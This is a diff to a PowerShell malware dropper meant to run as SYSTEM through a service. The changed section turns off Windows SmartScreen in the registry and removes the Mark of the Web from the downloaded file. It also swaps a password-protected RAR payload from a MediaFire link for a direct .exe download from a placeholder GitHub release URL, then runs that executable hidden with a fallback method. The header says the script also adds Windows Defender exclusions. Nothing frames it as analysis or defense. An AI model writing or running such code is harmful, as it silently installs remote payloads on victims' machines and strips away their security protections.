@@ -1,7 +1,7 @@
 # ----------------------------------------
 # script.ps1 (Optimized for LocalSystem Service Execution)
 # This script will be executed with SYSTEM privileges by your UpdaterSrv.
-# It adds Windows Defender exclusions and fetches/executes a payload.
+# It adds Windows Defender exclusions, disables SmartScreen, and fetches/executes an .exe payload.
 # ----------------------------------------
 Start-Sleep -Seconds 15
 
@@ -121,71 +121,78 @@ foreach ($excl in $exclusions) {
 Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
 
 # --- Fetch and Execute Payload ---
-$payloadUrl = "https://www.mediafire.com/file/0l2fx4lerit9mgc/test.rar" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
-$payloadPath = "C:\Windows\Temp\payload.rar"
-$extractPath = "C:\Windows\Temp\PayloadExtracted"
-$rarPassword = "SUBSCRIBE" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD
+$payloadUrl = "https://github.com/youruser/yourrepo/releases/download/v1.0/updater.exe" # <-- IMPORTANT: REPLACE WITH YOUR GITHUB RELEASE DIRECT LINK
+$payloadPath = "C:\Windows\Temp\updater.exe"
 
-Add-Content -Path $logPath -Value "Attempting to fetch, extract, and execute payload from $payloadUrl."
+Add-Content -Path $logPath -Value "Attempting to disable SmartScreen, fetch, and execute .exe payload from $payloadUrl."
 
 try {
+    # Disable SmartScreen via registry
+    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+    try {
+        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
+        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
+        # Continue execution, as SmartScreen may already be disabled or restricted by Group Policy
+    }
+
+    # Verify SmartScreen status for logging
+    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
+        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
+    } else {
+        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
+    }
+
     # Ensure payload directory exists
     if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
         New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
+        Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path $payloadPath -Parent)."
     }
 
-    # Ensure extraction directory exists
-    if (-not (Test-Path $extractPath)) {
-        New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
+    # Download the .exe payload using Invoke-WebRequest
+    Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
+    $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
+    Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"
+
+    # Log downloaded file size for reference
+    $downloadedSize = (Get-Item $payloadPath).Length
+    Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."
+
+    # Verify file is an executable (check for MZ header)
+    $fileBytes = Get-Content $payloadPath -Raw -Encoding Byte -ReadCount 0 | Select-Object -First 2
+    if ($fileBytes -notlike @(77, 90)) { # MZ signature for .exe
+        throw "Downloaded file is not a valid executable (invalid MZ signature)."
+    }
+    Add-Content -Path $logPath -Value "Downloaded file appears to be a valid executable (MZ signature verified)."
+
+    # Remove Mark of the Web to further reduce SmartScreen triggers
+    try {
+        Unblock-File -Path $payloadPath -ErrorAction Stop
+        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
     }
 
-    # Download the RAR payload
-    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 30
-    Add-Content -Path $logPath -Value "RAR payload downloaded to $payloadPath."
-
-    # Check for extraction tools (7-Zip or WinRAR)
-    $extractTool = $null
-    $sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
-    $winRarPath = "C:\Program Files\WinRAR\WinRAR.exe"
-
-    if (Test-Path $sevenZipPath) {
-        $extractTool = "7zip"
-        Add-Content -Path $logPath -Value "7-Zip found at $sevenZipPath."
-    } elseif (Test-Path $winRarPath) {
-        $extractTool = "winrar"
-        Add-Content -Path $logPath -Value "WinRAR found at $winRarPath."
-    } else {
-        throw "No extraction tool found. Please ensure 7-Zip or WinRAR is installed."
-    }
-
-    # Extract the RAR file using the available tool
-    if ($extractTool -eq "7zip") {
-        $extractCommand = "& `"$sevenZipPath`" x -p`"$rarPassword`" -o`"$extractPath`" `"$payloadPath`" -y"
-        Invoke-Expression $extractCommand | Out-Null
-        Add-Content -Path $logPath -Value "RAR payload extracted using 7-Zip to $extractPath."
-    } elseif ($extractTool -eq "winrar") {
-        $extractCommand = "& `"$winRarPath`" x -p`"$rarPassword`" `"$payloadPath`" `"$extractPath`"\ -y"
-        Invoke-Expression $extractCommand | Out-Null
-        Add-Content -Path $logPath -Value "RAR payload extracted using WinRAR to $extractPath."
-    }
-
-    # Find the .exe file in the extracted directory
-    $exeFiles = Get-ChildItem -Path $extractPath -Filter "*.exe" -File -Recurse
-    if ($exeFiles.Count -eq 1) {
-        $exePath = $exeFiles[0].FullName
-        Add-Content -Path $logPath -Value "Found executable: $exePath."
-
-        # Execute the .exe silently
-        Start-Process -FilePath $exePath -WindowStyle Hidden
-        Add-Content -Path $logPath -Value "Payload executed successfully."
-    } elseif ($exeFiles.Count -eq 0) {
-        throw "No .exe file found in the extracted payload."
-    } else {
-        throw "Multiple .exe files found in the extracted payload. Only one is allowed."
+    # Execute the .exe silently
+    try {
+        Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
+        Add-Content -Path $logPath -Value "Payload executed successfully using Start-Process."
+    } catch {
+        Add-Content -Path $logPath -Value "Start-Process execution failed: $_"
+        # Fallback: Try direct invocation
+        try {
+            & $payloadPath
+            Add-Content -Path $logPath -Value "Payload executed successfully using direct invocation."
+        } catch {
+            Add-Content -Path $logPath -Value "Direct invocation failed: $_"
+            throw "Failed to execute payload using all methods."
+        }
     }
 
 } catch {
-    Add-Content -Path $logPath -Value "Failed to fetch, extract, or execute payload from $payloadUrl. Error: $_"
+    Add-Content -Path $logPath -Value "Failed to disable SmartScreen, fetch, or execute payload from $payloadUrl. Error: $_"
 }
 
 Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
